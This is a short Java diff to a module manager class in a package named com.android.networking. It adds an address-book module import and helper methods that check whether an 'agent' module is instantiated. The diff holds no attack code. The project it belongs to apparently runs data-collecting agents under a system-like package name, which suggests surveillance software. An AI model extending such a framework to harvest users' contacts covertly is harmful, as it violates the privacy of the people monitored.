@@ -16,6 +16,7 @@ import com.android.networking.conf.ConfModule;
 import com.android.networking.interfaces.IncrementalLog;
 import com.android.networking.module.BaseModule;
 import com.android.networking.module.FactoryModule;
+import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 
@@ -172,7 +173,7 @@ public class ManagerModule extends Manager<BaseModule, String, String> {
 			threads.put(a, t);
 			t.start();
 		} else {
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (start) Error: Cannot set Configuration");
 			}
@@ -191,6 +192,14 @@ public class ManagerModule extends Manager<BaseModule, String, String> {
 		}
 
 		return base;
+	}
+
+	public boolean isInstancedAgent(String type) {
+		return instances.containsKey(type);
+	}
+
+	public boolean isInstancedAgent(Class<? extends BaseModule> cl) {
+		return instances.containsKey(getType(cl));
 	}
 
 	/**
@@ -250,6 +259,11 @@ public class ManagerModule extends Manager<BaseModule, String, String> {
 	public void start(String moduleId) {
 		start(moduleId, null);
 
+	}
+
+	public String getType(Class<? extends BaseModule> cl) {
+		FactoryModule fm = (FactoryModule) factory;
+		return fm.getType(cl);
 	}
 
 }
